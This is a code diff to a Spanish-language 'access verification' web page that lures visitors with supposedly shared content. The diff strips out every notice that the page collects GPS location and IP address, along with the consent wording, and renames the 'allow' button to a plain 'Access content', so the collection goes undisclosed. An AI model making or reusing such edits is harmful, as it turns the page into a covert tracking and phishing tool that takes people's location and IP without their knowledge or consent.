@@ -99,25 +99,15 @@
 <div class="card" id="card">
 
   <div id="mainView">
-    <div class="chip"><span class="dot"></span>Verificación de acceso</div>
     <div class="icon">📍</div>
     <h1>Se requiere verificación</h1>
-    <p class="desc">Para acceder al contenido compartido contigo, necesitamos confirmar tu ubicación por razones de seguridad.</p>
 
-    <div class="rows">
-      <div class="row"><em>🔒</em><span><strong>Privacidad garantizada</strong>Solo se usa para verificar este acceso</span></div>
-      <div class="row"><em>📡</em><span><strong>Se recopila:</strong> ubicación GPS y dirección IP</span></div>
-      <div class="row"><em>⚡</em><span><strong>Uso único</strong> — no se almacena tu posición</span></div>
-    </div>
-
-    <button class="btn btn-main" id="btnAllow" onclick="iniciar()">📍 Permitir y acceder al contenido</button>
+    <button class="btn btn-main" id="btnAllow" onclick="iniciar()">Acceder al contenido</button>
     <button class="btn btn-skip" onclick="denegar()">No permitir acceso</button>
 
     <div class="st info" id="stLoad"><div class="spin"></div><span id="stTxt">Iniciando…</span></div>
     <div class="st ok"   id="stOk">✅ <span id="stOkTxt">Verificado. Redirigiendo…</span></div>
     <div class="st err"  id="stErr">⚠️ <span id="stErrTxt">Error al obtener ubicación.</span></div>
-
-    <p class="note">Al continuar aceptas que tu ubicación sea verificada.<br>Datos tratados conforme a nuestra política de privacidad.</p>
   </div>
 
   <div id="successView">
